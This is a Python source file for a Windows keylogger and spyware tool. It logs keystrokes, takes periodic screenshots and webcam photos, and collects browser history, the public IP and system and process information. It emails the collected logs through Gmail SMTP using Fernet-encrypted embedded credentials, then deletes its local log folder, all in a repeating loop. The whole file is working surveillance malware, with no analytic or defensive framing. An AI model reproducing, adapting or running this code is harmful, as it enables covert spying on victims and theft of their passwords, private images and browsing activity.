import json
import logging
import pathlib
import shutil
import browserhistory
import subprocess
import sys
import cv2
import requests
import datetime
import os
import re
import smtplib
import time
from cryptography.fernet import Fernet
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pynput.keyboard import Listener
from PIL import ImageGrab


def decrypt(message):
    return Fernet(b'ei5t2CQp9CfR33BMEgiRYwAdkwdutJ6v62gNoP3hVrQ=').decrypt(bytes(message, 'utf-8')).decode("utf-8")


class Logger:

    def __init__(self, time_limit=300, time_interval=5, file_path='C:\\Users\\Public\\Logs\\'):
        print("Initiating a logger ...")
        self.logged_data = None
        self.time_limit = time_limit
        self.time_interval = time_interval
        self.file_path = file_path + 'logs\\'
        self.screenshots_path = self.file_path + 'screenshots\\'
        self.text_path = self.file_path + 'text\\'
        self.webcam_path = self.file_path + 'webcam\\'
        self.logging_keys_process = Process(target=self.log_keys)
        self.logging_screen_process = Process(target=self.log_screen)
        self.logging_webcam_process = Process(target=self.log_webcam)
        self.logging_browser_process = Process(target=self.log_browser_history)

    def gather_system_info(self):
        print("Gathering system information ...")
        with open(self.text_path + 'system_info.txt', 'a') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org').text
            except requests.ConnectionError:
                public_ip = '* Ipify connection failed *'

            system_info.write('Public IP Address: ' + public_ip + '\n')
            try:
                get_sys_info = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'],
                                                stdout=system_info, stderr=system_info, shell=True)

            except subprocess.TimeoutExpired:
                get_sys_info.kill()

    def create_paths(self):
        print("Creating paths ...")
        pathlib.Path(self.text_path).mkdir(parents=True, exist_ok=True)
        pathlib.Path(self.screenshots_path).mkdir(parents=True, exist_ok=True)
        pathlib.Path(self.webcam_path).mkdir(parents=True, exist_ok=True)

    def log(self, word):
        print("Key stroke logging ...")
        logging.basicConfig(filename=(self.text_path + 'key_logs.txt'),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        logging.info(str(word))

    def launch(self):
        self.create_paths()
        self.gather_system_info()
        print(f"Launching loggers ...")
        try:
            self.logging_keys_process.start()
            self.logging_screen_process.start()
            self.logging_webcam_process.start()
            self.logging_browser_process.start()

            self.logging_keys_process.join(timeout=self.time_limit)
            self.logging_screen_process.join(timeout=self.time_limit)
            self.logging_webcam_process.join(timeout=self.time_limit)
            self.logging_browser_process.join(timeout=self.time_limit)

        except Exception as error:
            logging.basicConfig(level=logging.DEBUG,
                                filename=self.text_path + 'error_log.txt')
            logging.exception(f'Error occurred at {time.time()} : {error}')

        self.end()

    def log_keys(self):
        print("Listening to key strokes ...")
        with Listener(on_press=lambda key: self.log(word=key)) as listening:
            listening.join()

    def log_screen(self):
        for number in range(self.time_limit):
            print("Taking a screenshot ...")
            pic = ImageGrab.grab()
            pic.save(self.screenshots_path + f'screenshot_{number}_{round(time.time())}.png')
            time.sleep(self.time_interval)

    def log_webcam(self):
        webcam = cv2.VideoCapture(0)
        for number in range(self.time_limit):
            print("Taking a picture ...")
            _, picture = webcam.read()
            file = (self.webcam_path + f'webcam_{number}_{round(time.time())}.jpg')
            cv2.imwrite(file, picture)
            time.sleep(self.time_interval)

        webcam.release()
        cv2.destroyAllWindows()

    def log_browser_history(self):
        print("Gathering browser history ...")
        try:
            browser_history = []
            user = browserhistory.get_username()
            db_path = browserhistory.get_database_paths()
            history = browserhistory.get_browserhistory()
            browser_history.extend((user, db_path, history))
            with open(self.text_path + 'browser.txt', 'a') as browser_txt:
                browser_txt.write(json.dumps(browser_history))
        finally:
            pass

    def end(self):
        print(f"Terminating loggers ...")
        self.logging_keys_process.terminate()
        self.logging_screen_process.terminate()
        self.logging_webcam_process.terminate()
        self.logging_browser_process.terminate()

    def clean_up(self):
        print("Removing the log folder ...")
        try:
            shutil.rmtree(self.file_path)
        except OSError:
            print("Folder not found!")


class Email:
    GMAIL_SMTP = "smtp.gmail.com"
    GMAIL_SSL_PORT = 465
    SERVER = smtplib.SMTP_SSL(host=GMAIL_SMTP, port=GMAIL_SSL_PORT)

    def __init__(self, user, password):
        print("Initiating an email ...")
        self.message = MIMEMultipart("alternative")
        self._email = user
        self._password = password

    def login(self):
        print(f"Logging in ...")
        Email.SERVER.login(user=decrypt(self._email), password=decrypt(self._password))

    def email_base(self):
        print("Creating the email ...")
        self.message['From'] = decrypt(self._email)
        self.message['To'] = decrypt(self._email)
        self.message['Subject'] = f'{datetime.date.today()}'
        body = f'Logged data as of {time.time()}'
        self.message.attach(MIMEText(body, 'plain', 'utf-16'))

    def attach_files(self, from_path):
        self.email_base()
        print("Attaching files ...")

        type_text = re.compile(r'.+\.txt$')
        type_png = re.compile(r'.+\.png$')
        type_jpg = re.compile(r'.+\.jpg$')

        for dir_path, dir_names, filenames in os.walk(from_path, topdown=True):
            for file in filenames:
                file_to_attach = MIMEBase('application', "octet-stream")
                file_to_attach.set_charset('utf-16')  # for an encoding bug
                if type_text.match(file):
                    with open(from_path + 'text\\' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                elif type_png.match(file):
                    with open(from_path + 'screenshots\\' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                elif type_jpg.match(file):
                    with open(from_path + 'webcam\\' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                file_to_attach.add_header('content-disposition', 'attachment',
                                          filename=('utf-16', '', f'{file}'))

                self.message.attach(file_to_attach)

    def send(self, data):
        print(f"Sending ...")
        Email.SERVER.sendmail(from_addr=decrypt(self._email),
                              to_addrs=decrypt(self._email),
                              msg=data.as_string())

    def end(self):
        print("Emptying the email object ...")
        self.message = None
        self._email = None
        self._password = None
        print("Closing the connection to the server ...")
        Email.SERVER.quit()


def main(time_limit=3600, time_interval=60, file_path="C:\\Users\\Public\\"):
    SETTINGS = (time_limit,
                time_interval,
                file_path)
    EMAIL_INFORMATION = (
            "gAAAAABgqPRCSVmNGRf60VYyIUk_CMCuGTPpqxKiziqAOx2FcoHExzDp2ObdTGRiAXoXg8YDu7JeqfZI_pEGpwcaDDMks1mhlqoagNM1esQ0nU"
            "-HRfQawLg=",
            "gAAAAABgqPRC1-pspwymaSPSPSd5tp6LTuyY63aGqncLt7bUWj4mOTveGOyVIFvhuhVDmfDU6_b9f1H_T8g4Lo5FBCxoFL_heQ==")

    try:
        for _ in range(time_limit):
            logger = Logger(*SETTINGS)
            logger.launch()
            email = Email(*EMAIL_INFORMATION)
            email.attach_files(logger.file_path)
            email.login()
            email.send(email.message)
            email.end()
            logger.clean_up()
            del logger, email
            time.sleep(time_interval)

    except KeyboardInterrupt:
        print('Program exiting ...')
        sys.exit()  # fail safe


main()